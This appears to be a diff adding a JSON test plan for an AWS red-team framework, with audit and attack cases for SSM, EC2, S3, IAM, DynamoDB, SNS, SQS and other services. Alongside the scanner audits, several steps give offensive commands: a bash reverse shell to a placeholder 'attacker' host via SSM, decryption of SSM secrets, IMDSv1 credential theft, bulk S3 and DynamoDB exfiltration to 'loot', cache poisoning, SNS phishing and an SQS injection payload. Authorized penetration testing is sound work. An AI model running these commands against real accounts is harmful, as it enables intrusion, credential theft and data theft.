@@ -1,0 +1,500 @@
+{
+  "code": "TP-AWS-OMNI-001",
+  "name": "Omni-Service AWS Red Team Operation",
+  "description": "Exhaustive testing framework covering all AWSServiceType entities. Integrates open-source scanners (Prowler, Nuclei, Pacu, ScoutSuite) and manual Burp Suite workflows.",
+  "test_cases": [
+    {
+      "code": "AWS-SSM-SECRETS-001",
+      "name": "SSM Parameter Store Harvesting",
+      "description": "Iterate through SSM Parameter Store to identify and decrypt sensitive configuration secrets.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ssm_svc",
+      "target_scope": {
+        "tags": ["ssm", "secrets"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ssm_svc",
+            "cardinality": "many",
+            "where": { "service_type": "ssm" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Recursive Parameter Dump",
+          "description": "List all parameters recursively from the root.",
+          "tool": "aws-cli",
+          "action": "enumerate",
+          "arguments": ["ssm get-parameters-by-path --path / --recursive"]
+        },
+        {
+          "title": "Decryption Test",
+          "description": "Attempt to decrypt SecureString parameters using the current IAM principal.",
+          "tool": "aws-cli",
+          "action": "exploit",
+          "arguments": [
+            "ssm get-parameter --name <PARAM_NAME> --with-decryption"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-SSM-RCE-001",
+      "name": "SSM Run Command Lateral Movement",
+      "description": "Abuse ssm:SendCommand to execute payloads on managed instances without SSH access.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ssm_svc",
+      "target_scope": {
+        "tags": ["ssm", "rce"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ssm_svc",
+            "cardinality": "many",
+            "where": { "service_type": "ssm" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Command Injection",
+          "description": "Execute a reverse shell payload on all targets accessible via SSM.",
+          "tool": "pacu",
+          "action": "exploit",
+          "arguments": [
+            "run ssm__exec --command 'bash -i >& /dev/tcp/attacker/443 0>&1'"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-API-BURP-001",
+      "name": "API Gateway Fuzzing (Burp Suite)",
+      "description": "Test API Gateway endpoints for injection vulnerabilities using Burp Suite.",
+      "execution_mode": "per_binding",
+      "execution_binding": "api_gw",
+      "target_scope": {
+        "tags": ["api", "burp"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "api_gw",
+            "cardinality": "many",
+            "where": { "service_type": "apigateway" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Proxy Interception",
+          "description": "Route traffic through Burp Proxy. Intercept valid request.",
+          "tool": "burp-suite",
+          "action": "intercept",
+          "arguments": ["Proxy: 127.0.0.1:8080"]
+        },
+        {
+          "title": "SQLi Fuzzing",
+          "description": "Send request to Intruder. Fuzz JSON parameters with SQL Injection list.",
+          "tool": "burp-suite",
+          "action": "fuzz",
+          "arguments": ["Payloads: Seclists/SQLi"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-CLOUDFRONT-BURP-001",
+      "name": "CloudFront Cache Poisoning (Burp Suite)",
+      "description": "Identify unkeyed headers in CloudFront to poison the cache.",
+      "execution_mode": "per_binding",
+      "execution_binding": "cf_dist",
+      "target_scope": {
+        "tags": ["cloudfront", "burp", "cache"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "cf_dist",
+            "cardinality": "many",
+            "where": { "service_type": "cloudfront" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Param Miner Scan",
+          "description": "Run Burp Suite Extension 'Param Miner' to identify hidden headers supported by the origin.",
+          "tool": "burp-suite",
+          "action": "scan",
+          "arguments": ["Extension: Param Miner"]
+        },
+        {
+          "title": "Poison Cache",
+          "description": "Inject malicious X-Forwarded-Host to redirect JS loads to attacker domain.",
+          "tool": "burp-suite",
+          "action": "exploit"
+        }
+      ]
+    },
+    {
+      "code": "AWS-EC2-PROWLER-001",
+      "name": "EC2 Security Posture Audit",
+      "description": "Run Prowler specifically against EC2 resources to check for open ports and unencrypted volumes.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ec2_inst",
+      "target_scope": {
+        "tags": ["ec2", "audit"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ec2_inst",
+            "cardinality": "many",
+            "where": { "service_type": "ec2" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Prowler EC2 Scan",
+          "description": "Execute Prowler check group for EC2.",
+          "tool": "prowler",
+          "action": "scan",
+          "arguments": [
+            "aws --services ec2 --check-ids ec2_securitygroup_allow_ingress_from_internet_to_any_port"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-EC2-IMDS-001",
+      "name": "EC2 IMDSv1 Credential Theft",
+      "description": "Exploit SSRF or shell access to steal IAM role credentials via IMDSv1.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ec2_inst",
+      "target_scope": {
+        "tags": ["ec2", "exploit"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ec2_inst",
+            "cardinality": "many",
+            "where": { "service_type": "ec2" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Extract Role Name",
+          "description": "Query meta-data for the security credentials path.",
+          "tool": "curl",
+          "action": "exploit",
+          "arguments": [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-S3-SCANNER-001",
+      "name": "S3 Public Bucket Discovery",
+      "description": "Use S3Scanner to identify if the bucket is readable/writable by 'AllUsers'.",
+      "execution_mode": "per_binding",
+      "execution_binding": "s3_bucket",
+      "target_scope": {
+        "tags": ["s3", "scan"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "s3_bucket",
+            "cardinality": "many",
+            "where": { "service_type": "s3" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "S3Scanner Run",
+          "description": "Scan the specific bucket URL.",
+          "tool": "s3scanner",
+          "action": "scan",
+          "arguments": ["scan --bucket <BUCKET_NAME>"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-S3-EXFIL-001",
+      "name": "S3 Mass Exfiltration (Sync)",
+      "description": "Exfiltrate all data from the bucket using high-performance sync.",
+      "execution_mode": "per_binding",
+      "execution_binding": "s3_bucket",
+      "target_scope": {
+        "tags": ["s3", "exfiltration"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "s3_bucket",
+            "cardinality": "many",
+            "where": { "service_type": "s3" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "AWS CLI Sync",
+          "description": "Download all objects to local loot directory.",
+          "tool": "aws-cli",
+          "action": "exfiltrate",
+          "arguments": ["s3 sync s3://<BUCKET_NAME> ./loot/<BUCKET_NAME>"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-RDS-SCOUT-001",
+      "name": "RDS Configuration Audit",
+      "description": "Use ScoutSuite logic to verify encryption at rest and public accessibility.",
+      "execution_mode": "per_binding",
+      "execution_binding": "rds_db",
+      "target_scope": {
+        "tags": ["rds", "audit"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "rds_db",
+            "cardinality": "many",
+            "where": { "service_type": "rds" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Public Snapshot Check",
+          "description": "Identify snapshots shared with the public.",
+          "tool": "aws-cli",
+          "action": "audit",
+          "arguments": ["rds describe-db-snapshots --snapshot-type public"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-IAM-PACU-001",
+      "name": "IAM Privilege Escalation (Pacu)",
+      "description": "Automated detection of privilege escalation paths using Pacu.",
+      "execution_mode": "per_binding",
+      "execution_binding": "iam_user",
+      "target_scope": {
+        "tags": ["iam", "exploit"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "iam_user",
+            "cardinality": "many",
+            "where": { "service_type": "iam" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Pacu PrivEsc",
+          "description": "Execute the iam__privesc_scan module.",
+          "tool": "pacu",
+          "action": "scan",
+          "arguments": ["run iam__privesc_scan"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-EKS-HUNTER-001",
+      "name": "EKS Cluster Penetration (Kube-hunter)",
+      "description": "Active penetration testing of the EKS API endpoint.",
+      "execution_mode": "per_binding",
+      "execution_binding": "eks_cluster",
+      "target_scope": {
+        "tags": ["eks", "scan"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "eks_cluster",
+            "cardinality": "many",
+            "where": { "service_type": "eks" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Run Kube-hunter",
+          "description": "Scan the cluster endpoint for CVEs and misconfigurations.",
+          "tool": "kube-hunter",
+          "action": "scan",
+          "arguments": ["--remote <ENDPOINT>"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-ELB-NUCLEI-001",
+      "name": "ELB Vulnerability Scan (Nuclei)",
+      "description": "Scan Load Balancer DNS for web vulnerabilities.",
+      "execution_mode": "per_binding",
+      "execution_binding": "elb_lb",
+      "target_scope": {
+        "tags": ["elb", "scan"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "elb_lb",
+            "cardinality": "many",
+            "where": { "service_type": "elb" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Nuclei Scan",
+          "description": "Run AWS technology templates against the ELB DNS.",
+          "tool": "nuclei",
+          "action": "scan",
+          "arguments": ["-u <DNS_NAME> -t technologies/aws"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-DYNAMODB-SCAN-001",
+      "name": "DynamoDB Full Table Exfiltration",
+      "description": "Perform a full table scan to dump database content.",
+      "execution_mode": "per_binding",
+      "execution_binding": "ddb_table",
+      "target_scope": {
+        "tags": ["dynamodb", "exfiltration"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "ddb_table",
+            "cardinality": "many",
+            "where": { "service_type": "dynamodb" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Scan Table",
+          "description": "Dump all items to JSON output.",
+          "tool": "aws-cli",
+          "action": "exfiltrate",
+          "arguments": ["dynamodb scan --table-name <NAME> --output json"]
+        }
+      ]
+    },
+    {
+      "code": "AWS-SNS-SPAM-001",
+      "name": "SNS Topic Spam / Phishing",
+      "description": "Publish unauthorized messages to public or shared SNS topics.",
+      "execution_mode": "per_binding",
+      "execution_binding": "sns_topic",
+      "target_scope": {
+        "tags": ["sns", "abuse"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "sns_topic",
+            "cardinality": "many",
+            "where": { "service_type": "sns" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Publish Message",
+          "description": "Broadcast message to all subscribers.",
+          "tool": "aws-cli",
+          "action": "exploit",
+          "arguments": [
+            "sns publish --topic-arn <ARN> --message 'Urgent Security Update'"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-SQS-INJECT-001",
+      "name": "SQS Malicious Payload Injection",
+      "description": "Inject malicious payloads into queues to attack downstream workers.",
+      "execution_mode": "per_binding",
+      "execution_binding": "sqs_queue",
+      "target_scope": {
+        "tags": ["sqs", "injection"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "sqs_queue",
+            "cardinality": "many",
+            "where": { "service_type": "sqs" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Send Message",
+          "description": "Inject JSON payload with known exploit strings.",
+          "tool": "aws-cli",
+          "action": "exploit",
+          "arguments": [
+            "sqs send-message --queue-url <URL> --message-body '{\"cmd\": \"; id\"}'"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-VPC-AUDIT-001",
+      "name": "VPC Reachability Analysis",
+      "description": "Audit Network ACLs and Security Groups for wide open ingress.",
+      "execution_mode": "per_binding",
+      "execution_binding": "vpc_net",
+      "target_scope": {
+        "tags": ["vpc", "audit"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "vpc_net",
+            "cardinality": "many",
+            "where": { "service_type": "vpc" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "Check 0.0.0.0/0",
+          "description": "Filter Security Groups for 0.0.0.0/0 on port 22 or 3389.",
+          "tool": "aws-cli",
+          "action": "audit",
+          "arguments": [
+            "ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0"
+          ]
+        }
+      ]
+    },
+    {
+      "code": "AWS-LEX-AUDIT-001",
+      "name": "Lex Bot Policy Audit",
+      "description": "Ensure Lex bots do not have resource policies allowing public access.",
+      "execution_mode": "per_binding",
+      "execution_binding": "lex_bot",
+      "target_scope": {
+        "tags": ["lex", "audit"],
+        "bindings": [
+          {
+            "kind": "peripheral",
+            "name": "lex_bot",
+            "cardinality": "many",
+            "where": { "service_type": "lex" }
+          }
+        ]
+      },
+      "steps": [
+        {
+          "title": "List Bot Policies",
+          "description": "Retrieve resource-based policies for bots.",
+          "tool": "aws-cli",
+          "action": "audit",
+          "arguments": ["lexv2-models list-bots"]
+        }
+      ]
+    }
+  ]
+}
